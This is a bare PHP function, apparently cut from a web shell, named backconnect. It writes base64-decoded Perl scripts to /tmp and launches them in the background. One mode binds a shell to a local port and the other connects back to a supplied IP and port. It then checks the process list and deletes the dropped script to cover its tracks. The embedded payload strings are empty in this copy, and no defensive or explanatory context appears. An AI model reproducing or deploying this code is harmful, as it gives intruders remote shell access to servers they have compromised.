function backconnect($bmode,$bip,$bport) {
	$back_connect_p = "";
	$bind_port_p = "";		
		function cf($f, $t) {
			$w = @fopen($f, "w") or @function_exists('file_put_contents');
			if ($w) {
				@fwrite($w, base64_decode($t));
				@fclose($w);
			}
		}
		if ($bmode == 'bpp') {
			cf("/tmp/bp.pl", $bind_port_p);
			$out = cmdExe("perl /tmp/bp.pl " . $bport . " 1>/dev/null 2>&1 &");
			sleep(1);
			echo "<pre class=ml1>$out". cmdExe("ps aux | grep bp.pl") . "</pre>";
			unlink("/tmp/bp.pl");
		}
		if ($bmode == 'bcp') {
			cf("/tmp/bc.pl", $back_connect_p);
			$out = cmdExe("perl /tmp/bc.pl " . $bip . " " . $bport . " 1>/dev/null 2>&1 &");
			sleep(1);
			echo "<pre class=ml1>$out\n".cmdExe("ps aux | grep bc.pl")."</pre>";
			unlink("/tmp/bc.pl");
		}

}
